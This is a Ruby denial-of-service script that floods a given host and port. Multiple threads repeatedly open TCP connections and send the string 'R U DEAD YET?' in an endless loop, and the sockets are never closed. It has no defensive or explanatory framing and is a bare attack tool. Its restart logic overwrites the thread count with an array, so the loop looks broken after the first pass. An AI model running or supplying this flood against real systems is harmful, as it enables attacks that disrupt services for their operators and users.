require "socket"
include Socket::Constants

threads = 8
connections = 16

if ARGV.length < 2
	puts "Usage: #{$0} [host] [port] <threads> <connections>"
	exit
else
	host = ARGV[0]
	port = ARGV[1]
	threads = ARGV[2].to_i unless ARGV[2] == nil
	connections = ARGV[3].to_i unless ARGV[3] == nil
	while true
		threads = Array.new(threads) do |index|
			Thread.new do
				(0..connections).each do
					socket = Socket.new(AF_INET, SOCK_STREAM, 0)
					sockaddr = Socket.pack_sockaddr_in(port, host)
					socket.connect(sockaddr)
					socket.write("R U DEAD YET?")
				end
				puts "[thread #{index} | #{connections}]"
			end
		end
		threads.each do |thread|
			thread.join
		end
		puts "[all threads complete, restarting]"
	end
end